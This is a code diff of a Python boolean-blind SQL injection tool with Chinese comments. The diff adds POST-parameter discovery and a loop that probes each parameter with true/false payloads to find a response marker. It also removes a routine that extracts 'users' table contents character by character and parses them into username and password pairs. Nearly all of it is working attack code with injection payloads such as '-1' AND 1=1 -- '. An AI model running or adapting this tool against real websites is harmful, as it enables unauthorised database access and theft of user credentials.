@@ -26,8 +26,8 @@ DEFAULT_HEADERS = {
 class SQLInjection:
 
     def __init__(self, url, body_type="form", method="get", headers=None, prefix="-1'", suffix=" -- ",
-                 table_name="users", columns=None, keyword=None, op="OR",
-                 params_name=None, timeout=10, max_length=250, extra_params=None):
+                 table_name="users", columns=None, keyword=None, op="AND",
+                 params_name=None,post_data=None, timeout=10, max_length=250, extra_params=None):
         # 构造阶段：校验参数，并提前算好列名拼接片段
         # body_type 决定 POST 请求体格式：form（默认）或 json；也兼容标准 Content-Type 写法
         _body = str(body_type).strip().lower()
@@ -48,6 +48,7 @@ class SQLInjection:
         self.timeout = timeout
         self.max_length = max_length
         self.table_name = table_name
+        self.post_data = post_data or {}
 
         if extra_params is None:
             self.extra_params = {}
@@ -97,7 +98,7 @@ class SQLInjection:
         if baseline_false and self.op == "AND":
             self.log_warning(
                 f"prefix={self.prefix} 以负号开头，原查询条件为假，op 建议用 OR（现在是 AND）。"
-                f"搭配错了的话真假响应会一模一样，一个字符都猜不出来。 -- > "
+                f"搭配错了的话真假响应会一模一样，一个字符都猜不出来。"
             )
         elif not baseline_false and self.op == "OR":
             self.log_warning(
@@ -123,19 +124,18 @@ class SQLInjection:
             all_params = list(qs.keys())   # 内置函数 list()：取 URL 中的全部参数名
             self.log_info(f"从 URL 解析到参数：{all_params}")
             return all_params
+        if isinstance(self.post_data,dict) and self.post_data:
+            all_param = list(self.post_data.keys())
+            self.log_info(f"从 POST 数据解析到参数：{all_param}")
+            return all_param
 
         self.log_error(f"{self.url} 里没有查询参数，无法自动确定注入点，请手动传 params_name，例如 params_name='id'")
         raise ValueError("URL 没有查询参数，请手动传入 params_name")
 
     def _resolve_param(self):
-        # 若探测阶段已确认某个参数有注入点，就直接复用它
-        if self.target_param:
-            return self.target_param
-        names = self.get_params_name()
-        self.target_param = names[0]
-        if len(names) > 1:   # 内置函数 len()：判断 URL 中是否不止一个参数
-            self.log_warning(f"URL 里有多个参数 {names}，默认只用第一个 {self.target_param}；"
-                             f"想指定别的请在构造时传 params_name='xxx'")
+        # 只负责返回已锁定的参数；遍历探测由 detect_keyword() 完成
+        if not self.target_param:
+            raise RuntimeError("尚未锁定注入参数，请先调用 detect_keyword()")
         return self.target_param
 
     @property
@@ -160,6 +160,7 @@ class SQLInjection:
             if self.body_type == "json":
                 return self.session.post(self.url, json=params, timeout=self.timeout)
             else:
+                self.log_info(f"POST form: url={self.url} data={params}")
                 return self.session.post(self.url, data=params, timeout=self.timeout)
         else:
             raise ValueError(f"不支持的 HTTP 方法：{method}")
@@ -207,113 +208,65 @@ class SQLInjection:
         #         return True
         # return False
 
-    def ordinary_request(self):
+    def ordinary_request(self,param):
         # 真/假各请求两次：两次真都有、两次假都没有的行，才算稳定地判断标志
         true_payload = f"{self.prefix} {self.op} 1=1{self.suffix}"
         false_payload = f"{self.prefix} {self.op} 1=2{self.suffix}"
 
-        for param in self.get_params_name():
-            self.log_info(f"正在测试参数：{param}")
-            try:
-                t1 = self._get(param, true_payload)
-                f1 = self._get(param, false_payload)
 
-                if t1.status_code != f1.status_code:
-                    self.log_warning(f"真假响应状态码不同：{t1.status_code} vs {f1.status_code}，"
+        self.log_info(f"正在测试参数：{param}")
+        try:
+            t1 = self._get(param, true_payload)
+            f1 = self._get(param, false_payload)
+            print(true_payload)
+            print(t1.text)
+
+
+            if t1.status_code != f1.status_code:
+                self.log_warning(f"真假响应状态码不同：{t1.status_code} vs {f1.status_code}，"
                                      f"可能是报错型注入，布尔盲注未必适用")
 
-                if t1.text == f1.text:
-                    self.log_warning(f"参数 {param}：真假两次响应完全相同，"
+            if t1.text == f1.text:
+                self.log_warning(f"参数 {param}：真假两次响应完全相同，"
                                      f"说明这个参数没有注入点，或被 WAF 拦截，或 prefix/op 搭配不对")
-                    continue
-
-                t2 = self._get(param, true_payload)
-                f2 = self._get(param, false_payload)
-            except requests.RequestException as ex:
-                self.log_error(f"请求失败：{ex}")
                 return None
 
-            true_lines = self._visible_lines(t1.text)
-            true_lines_again = set(self._visible_lines(t2.text))   # 内置函数 set()：把行列表转成集合，后续 O(1) 判断某行是否存在
-            false_lines = set(self._visible_lines(f1.text)) | set(self._visible_lines(f2.text))   # 内置函数 set()：两次假页面的行合并成集合，便于排除
+            t2 = self._get(param, true_payload)
+            f2 = self._get(param, false_payload)
+        except requests.RequestException as ex:
+            self.log_error(f"请求失败：{ex}")
+            return None
 
-            for line in true_lines:
-                if len(line) < 6:   # 内置函数 len()：过短的行（如 "1"）容易误判，直接跳过
-                    continue
-                if self.reflects(line, true_payload, false_payload):
-                    continue
-                if line in true_lines_again and line not in false_lines:
-                    self.target_param = param
-                    self.log_info(f"[+] 参数 {param} 存在布尔盲注，判断标志：{line}")
-                    return line
+        true_lines = self._visible_lines(t1.text)
+        true_lines_again = set(self._visible_lines(t2.text))   # 内置函数 set()：把行列表转成集合，后续 O(1) 判断某行是否存在
+        false_lines = set(self._visible_lines(f1.text)) | set(self._visible_lines(f2.text))   # 内置函数 set()：两次假页面的行合并成集合，便于排除
 
-            self.log_warning(f"参数 {param}：没找到稳定且有区分度的判断标志")
+        for line in true_lines:
+            if len(line) < 6:   # 内置函数 len()：过短的行（如 "1"）容易误判，直接跳过
+                continue
+            if self.reflects(line, true_payload, false_payload):
+                continue
+            if line in true_lines_again and line not in false_lines:
+                self.target_param = param
+                self.log_info(f"[+] 参数 {self.target_param} 存在布尔盲注，判断标志：{line}")
+                return line
+
+        self.log_warning(f"参数 {param}：没找到稳定且有区分度的判断标志")
+        return None
+
+    def detect_keyword(self):
+        # 遍历所有参数，命中判断标志就锁定参数并返回
+        for param in self.get_params_name():
+            keyword = self.ordinary_request(param)
+            if keyword:
+                self.target_param = param
+                self.keyword = keyword
+                self.log_info(f"[+] 参数 {param} 存在布尔盲注，判断标志：{keyword}")
+                return keyword
 
         self.log_error("所有参数都试过了，没找到判断标志。可以自己在构造时传 keyword='页面里的某段文字'")
         return None
 
-    def detect_keyword(self):
-        # 自动探测判断标志，成功后写回 self.keyword
-        result = self.ordinary_request()
-        if result:
-            self.log_info(f"--> 已找到判断标志：{result}")
-            self.keyword = result
-            return result
-        self.log_error("--> 没能自动找到判断标志，请手动传入 keyword 参数")
-        return None
 
-    def blind_sql(self):
-        # 逐位二分：ascii(substr(...)) > mid，真则往大找，假则记下 mid 往小找
-        if not self.keyword:
-            self.log_error("还没有判断标志（keyword），请先调用 detect_keyword()，或构造时手动传 keyword")
-            return None
+    # 盲注的猜解流程已拆分到 Bool_sqli.py 的 BoolSQLi.blind_sql()
 
-        param = self._resolve_param()
-        inner_query = f"select group_concat({self.concat_target}) from {self.table_name}"
-
-        result = ""
-        for pos in range(1,self.max_length + 1):   # 内置函数 range()：生成 1 ~ max_length 的字符位置序号
-            lo = 0
-            hi = 127
-            found_ascii = -1
-            while lo <= hi:
-                mid = (lo + hi) // 2
-                payload = (f"{self.prefix} {self.op} "
-                           f"ascii(substr(({inner_query}),{pos},1))> {mid}"
-                           f"{self.suffix}")
-                try:
-                    resp = self._get(param, payload)
-                except requests.RequestException as ex:
-                    self.log_error(f"第 {pos} 位试字符,二分mid:{mid}请求异常，跳过：{ex}")
-                    found_ascii = 0
-                    break
-
-                if self.keyword in resp.text:
-                    lo = mid + 1
-                else:
-                    found_ascii = mid
-                    hi = mid - 1
-            if found_ascii <= 0:
-                self.log_info(f"第{pos}位无效字符")
-                break
-            char = chr(found_ascii)   # 内置函数 chr()：把 ASCII 码转回字符
-            result += char
-
-            self.log_info(f"第 {pos} 位 = {mid}  -> 当前结果{result}")
-
-        user_dict = {}
-        records = result.split(",")
-        for record in records:
-            if ":" in record:
-                data = record.split(":")
-                if len(data) == 2:   # 内置函数 len()：只有拆成两段才是"用户名:密码"
-                    username = data[0].strip()
-                    password = data[1].strip()
-                    user_dict[username] = password
-            else:
-                user_dict[record.strip()] = ""
-
-        if user_dict:
-            return user_dict
-
-        return {}
